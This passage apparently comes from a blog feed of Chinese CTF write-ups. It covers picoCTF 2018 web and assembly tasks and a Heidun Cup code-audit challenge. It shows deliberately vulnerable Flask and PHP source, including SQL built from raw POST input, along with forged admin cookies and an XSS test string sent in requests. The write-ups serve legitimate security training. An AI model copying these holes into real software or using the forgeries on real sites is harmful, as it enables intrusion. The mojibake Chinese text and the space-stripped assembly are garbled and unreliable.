class="line"><span class="attribute">content-type</span>: text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span>: 23</span><br><span class="line"><span class="attribute">date</span>: Tue, 09 Oct 2018 15:11:46 GMT</span><br><span class="line"><span class="attribute">connection</span>: close</span><br><span class="line"></span><br><span class="line">Found. Redirecting to /</span><br></pre></td></tr></table></figure><p>Â∏¶‰∏äcookieËØ∑Ê±ÇÔºö</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br><span class="line"><span class="attribute">cookie</span>: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br></pre></td></tr></table></figure><p>ÂìçÂ∫îÔºö</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">x-powered-by</span>: Express</span><br><span class="line"><span class="attribute">content-type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span>: 438</span><br><span class="line"><span class="attribute">etag</span>: W/"1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg"</span><br><span class="line"><span class="attribute">date</span>: Tue, 09 Oct 2018 15:12:57 GMT</span><br><span class="line"><span class="attribute">connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;link rel="stylesheet" type="text/css" href="main.css" /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;header&gt;</span><br><span class="line">            &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">            &lt;div class="user"&gt;Real Business Employee&lt;/div&gt;</span><br><span class="line">            &lt;a href="/logout"&gt;Logout&lt;/a&gt;</span><br><span class="line">        &lt;/header&gt;</span><br><span class="line">        &lt;main&gt;</span><br><span class="line">            &lt;p&gt;Hello &lt;b&gt;Real Business Employee&lt;/b&gt;!  Today's flag is: &lt;code&gt;picoCTF&#123;0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14&#125;&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line">        &lt;/main&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="„ÄêX„ÄëSecure-Logon"><a href="#„ÄêX„ÄëSecure-Logon" class="headerlink" title="„ÄêX„ÄëSecure Logon"></a>„ÄêX„ÄëSecure Logon</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for, redirect, make_response, flash</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'seed removed'</span></span><br><span class="line">flag_value = <span class="string">'flag removed'</span></span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span>  <span class="comment"># Bytes</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \</span><br><span class="line">                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)</span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[:-ord(s[len(s) - <span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.form[<span class="string">'user'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">        message = <span class="string">"I'm sorry the admin password is super secure. You're not getting in that way."</span></span><br><span class="line">        category = <span class="string">'danger'</span></span><br><span class="line">        flash(message, category)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    resp = make_response(redirect(<span class="string">"/flag"</span>))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;&#125;</span><br><span class="line">    cookie[<span class="string">'password'</span>] = request.form[<span class="string">'password'</span>]</span><br><span class="line">    cookie[<span class="string">'username'</span>] = request.form[<span class="string">'user'</span>]</span><br><span class="line">    cookie[<span class="string">'admin'</span>] = <span class="number">0</span></span><br><span class="line">    print(cookie)</span><br><span class="line">    cookie_data = json.dumps(cookie, sort_keys=<span class="keyword">True</span>)</span><br><span class="line">    encrypted = AESCipher(app.secret_key).encrypt(cookie_data)</span><br><span class="line">    print(encrypted)</span><br><span class="line">    resp.set_cookie(<span class="string">'cookie'</span>, encrypted)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(redirect(<span class="string">"/"</span>))</span><br><span class="line">    resp.set_cookie(<span class="string">'cookie'</span>, <span class="string">''</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">      encrypted = request.cookies[<span class="string">'cookie'</span>]</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">      flash(<span class="string">"Error: Please log-in again."</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'main'</span>))</span><br><span class="line">  data = AESCipher(app.secret_key).decrypt(encrypted)</span><br><span class="line">  data = json.loads(data)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">     check = data[<span class="string">'admin'</span>]</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">     check = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> check == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">return</span> render_template(<span class="string">'flag.html'</span>, value=flag_value)</span><br><span class="line">  flash(<span class="string">"Success: You logged in! Not sure you'll be able to see the flag though."</span>, <span class="string">"success"</span>)</span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">'not-flag.html'</span>, cookie=data)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Usage:</span></span><br><span class="line"><span class="string">        c = AESCipher('password').encrypt('message')</span></span><br><span class="line"><span class="string">        m = AESCipher('password').decrypt(c)</span></span><br><span class="line"><span class="string">    Tested under Python 3 and PyCrypto 2.6.1.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = md5(key.encode(<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, raw)</span>:</span></span><br><span class="line">        raw = pad(raw)</span><br><span class="line">        iv = Random.new().read(AES.block_size)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> b64encode(iv + cipher.encrypt(raw))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, enc)</span>:</span></span><br><span class="line">        enc = b64decode(enc)</span><br><span class="line">        iv = enc[:<span class="number">16</span>]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> unpad(cipher.decrypt(enc[<span class="number">16</span>:])).decode(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h2 id="„ÄêX„ÄëA-Simple-Question"><a href="#„ÄêX„ÄëA-Simple-Question" class="headerlink" title="„ÄêX„ÄëA Simple Question"></a>„ÄêX„ÄëA Simple Question</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &quot;config.php&quot;;</span><br><span class="line">  ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  $answer = $_POST[&quot;answer&quot;];</span><br><span class="line">  $debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  $query = &quot;SELECT * FROM answers WHERE answer=&apos;$answer&apos;&quot;;</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;;</span><br><span class="line">  echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $con = new SQLite3($database_file);</span><br><span class="line">  $result = $con-&gt;query($query);</span><br><span class="line"></span><br><span class="line">  $row = $result-&gt;fetchArray();</span><br><span class="line">  if($answer == $CANARY)  &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Perfect!&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  elseif ($row) &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;You are so close.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Wrong.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="reversing"><a href="#reversing" class="headerlink" title="reversing"></a>reversing</h1><h2 id="assembly-0"><a href="#assembly-0" class="headerlink" title="assembly-0"></a>assembly-0</h2><p>What does asm0(0xd8,0x7a) return? 0x7a„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm0</span><br><span class="line"></span><br><span class="line">asm0:</span><br><span class="line">pushebp</span><br><span class="line">movebp,esp</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">movebx,DWORD PTR [ebp+0xc]</span><br><span class="line">moveax,ebx</span><br><span class="line">movesp,ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-1"><a href="#assembly-1" class="headerlink" title="assembly-1"></a>assembly-1</h2><p>What does asm1(0xcd) return? 0xca„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm1</span><br><span class="line"></span><br><span class="line">asm1:</span><br><span class="line">pushebp</span><br><span class="line">movebp,esp</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0xde</span><br><span class="line">jg part_a</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0x8</span><br><span class="line">jnepart_b</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">addeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_a:</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0x4e</span><br><span class="line">jnepart_c</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_b:</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0xee</span><br><span class="line">jnepart_c</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_c:</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">addeax,0x3</span><br><span class="line">part_d:</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-2"><a href="#assembly-2" class="headerlink" title="assembly-2"></a>assembly-2</h2><p>What does asm2(0x7,0x28) return?   <code>hex(int((0xa1df-0x7)/float(0x76))+1+0x28)</code> =&gt; 0x188</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm2</span><br><span class="line"></span><br><span class="line">asm2:</span><br><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">sub    esp,0x10</span><br><span class="line">mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">mov DWORD PTR [ebp-0x4],eax</span><br><span class="line">mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">movDWORD PTR [ebp-0x8],eax</span><br><span class="line">jmp    part_b</span><br><span class="line">part_a:</span><br><span class="line">add    DWORD PTR [ebp-0x4],0x1</span><br><span class="line">addDWORD PTR [ebp+0x8],0x76</span><br><span class="line">part_b:</span><br><span class="line">cmp    DWORD PTR [ebp+0x8],0xa1de</span><br><span class="line">jle    part_a</span><br><span class="line">mov    eax,DWORD PTR [ebp-0x4]</span><br><span class="line">movesp,ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-3"><a href="#assembly-3" class="headerlink" title="assembly-3"></a>assembly-3</h2><p>What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return?  0x478</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp+0x8=&gt;0xbda42100</span><br><span class="line">ebp+0xc=&gt;0xb98dd6a5</span><br><span class="line">ebp+0x10=&gt;0xecded223</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm3</span><br><span class="line"></span><br><span class="line">asm3:</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp,esp</span><br><span class="line">        mov     eax,0xbc;0xbc</span><br><span class="line">        xor     al,al;0x00</span><br><span class="line">        mov     ah,BYTE PTR [ebp+0x9];0x2100</span><br><span class="line">        sal     ax,0x10;0x0000</span><br><span class="line">        sub     al,BYTE PTR [ebp+0xc];0x005b</span><br><span class="line">        add     ah,BYTE PTR [ebp+0xd];0xd65b</span><br><span class="line">        xor     ax,WORD PTR [ebp+0x10];0xd65b^0xd223=0x478</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure><p>ÊúâÂá†ÁÇπÈúÄË¶ÅÊ≥®ÊÑè„ÄÇ‰∏ÄÊòØÊï∞ÊçÆÈááÁî®Â∞èÁ´ØÂ∫èÂ≠òÂÇ®ÔºåÈ´òÂ≠óËäÇÂú®È´òÂú∞ÂùÄÔºå[ebp+0x8]ÁöÑÂÄºÊòØ0x00ËÄåÈùû0xbdÔºõ‰∫åÊòØ <code>sub 0x00,0xa5</code> ÁöÑÂÄºÊòØ<code>0x100-0xa5=0x5b</code> „ÄÇ ‰∏âÊòØ<code>WORD PTR [ebp+0x10]</code> ÁöÑÂÄºÊòØ<code>0xd223</code> ËÄåÈùû<code>0x23d2</code> „ÄÇ</p><p><img src="1541310455800.png" alt="1541310455800"></p><p>ÂèØÂèÇËÄÉ <a href="https://github.com/xnand/ctf_writeups/blob/master/picoCTF2018/assembly-0-1-2-3-4/README.md" target="_blank" rel="noopener">Ê≠§Â§Ñ</a> Â∞ÜÊ±áÁºñ‰ª£Á†ÅÁºñËØëÊàêÂÖ±‰∫´Â∫ìÂú®CÁ®ãÂ∫è‰∏≠Ë∞ÉÁî®„ÄÇÊâßË°åÂæóÂà∞ÁªìÊûúÔºå‰πüÂèØË∞ÉËØïÂä†Ê∑±ÁêÜËß£„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global asm3</span><br><span class="line"></span><br><span class="line">asm3:</span><br><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">moveax,0x19</span><br><span class="line">xoral,al</span><br><span class="line">movah,BYTE [ebp+0xa]</span><br><span class="line">salax,0x10</span><br><span class="line">subal,BYTE [ebp+0xd]</span><br><span class="line">addah,BYTE [ebp+0xc]</span><br><span class="line">xorax,WORD [ebp+0x12]</span><br><span class="line">movesp, ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br><span class="line">##################</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">extern int asm3(int a, int b, int c);</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line"></span><br><span class="line">printf(&quot;0x%x\n&quot;, asm3(0xb5e8e971,0xc6b58a95,0xe20737e9));</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">##################</span><br><span class="line">[andrei@jacky 15:27:00] ~/Documents/pico/3</span><br><span class="line">‚Äî‚Äî&gt; nasm -f elf32 end_asm_rev.S -o asmfun.o</span><br><span class="line">[andrei@jacky 15:27:42] ~/Documents/pico/3</span><br><span class="line">‚Äî‚Äî&gt; gcc sol.c asmfun.o -o sol -m32</span><br><span class="line">[andrei@jacky 15:27:59] ~/Documents/pico/3</span><br><span class="line">‚Äî‚Äî&gt; ./sol</span><br></pre></td></tr></table></figure><h2 id="assembly-4"><a href="#assembly-4" class="headerlink" title="assembly-4"></a>assembly-4</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/pico18<span class="comment"># nasm -f elf32 comp.nasm -o comp.o</span></span><br><span class="line">root@kali:~/ctf/pico18<span class="comment"># gcc -m32 -o comp comp.o</span></span><br><span class="line">root@kali:~/ctf/pico18<span class="comment"># ./comp</span></span><br><span class="line">picoCTF&#123;1_h0p3_y0u_c0mP1l3d_tH15_32429699163</span><br></pre></td></tr></table></figure><p><code>picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_3242969916}</code> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;1539266772853.png&quot; alt=&quot;1539266772853&quot;&gt;&lt;/p&gt;
&lt;p&gt;È¢òÁõÆÔºö&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://2018game.picoctf.com/problems&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Á¶èÂª∫ÁúÅÈªëÁõæÊùØËß£È¢òÊä•Âëä</title>
    <link href="https://findneo.github.io/180920-heidunbei/"/>
    <id>https://findneo.github.io/180920-heidunbei/</id>
    <published>2018-09-20T06:07:27.000Z</published>
    <updated>2019-01-25T23:21:37.076Z</updated>
    
    <content type="html"><![CDATA[<p>2018/9/16  Á¶èÂ∏àÂ§ßÈªëÁõæÊùØ</p><p><img src="1541605429359.png" alt="1541605429359"></p><h1 id="‰ø°ÊÅØÊ≥ÑÈú≤-‰ª£Á†ÅÂÆ°ËÆ°"><a href="#‰ø°ÊÅØÊ≥ÑÈú≤-‰ª£Á†ÅÂÆ°ËÆ°" class="headerlink" title="‰ø°ÊÅØÊ≥ÑÈú≤+‰ª£Á†ÅÂÆ°ËÆ°"></a>‰ø°ÊÅØÊ≥ÑÈú≤+‰ª£Á†ÅÂÆ°ËÆ°</h1><p>svnÊ≥ÑÈú≤Ê∫êÁ†ÅÔºö<a href="http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt" target="_blank" rel="noopener">http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$user = $_COOKIE[<span class="string">'user'</span>];</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>]?(int)$_GET[<span class="string">'code'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($user == <span class="string">'admin'</span> &amp;&amp; !<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line">$hex = (int)$code;</span><br><span class="line"><span class="keyword">if</span>(($hex ^ <span class="number">6789</span>) === <span class="number">0xCDEF</span>) &#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"»±ÔøΩÔøΩ”¶ÔøΩ–µƒ≤ÔøΩÔøΩÔøΩ,ÔøΩÔøΩ√ªÔøΩÔøΩ»®ÔøΩﬁ≤Èø¥ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>GET</code> ËØ∑Ê±Ç<code>code=55146</code> Ôºå  ËØ∑Ê±ÇÂ§¥Ê∑ªÂä†<code>Cookie: user=admin;</code> „ÄÇ</p><p><code>flag{a737c5c5b759c3705c8100accf65b5e4}</code> </p><h1 id="ÊúÄÂ•ΩÁöÑËØ≠Ë®Ä"><a href="#ÊúÄÂ•ΩÁöÑËØ≠Ë®Ä" class="headerlink" title="ÊúÄÂ•ΩÁöÑËØ≠Ë®Ä"></a>ÊúÄÂ•ΩÁöÑËØ≠Ë®Ä</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 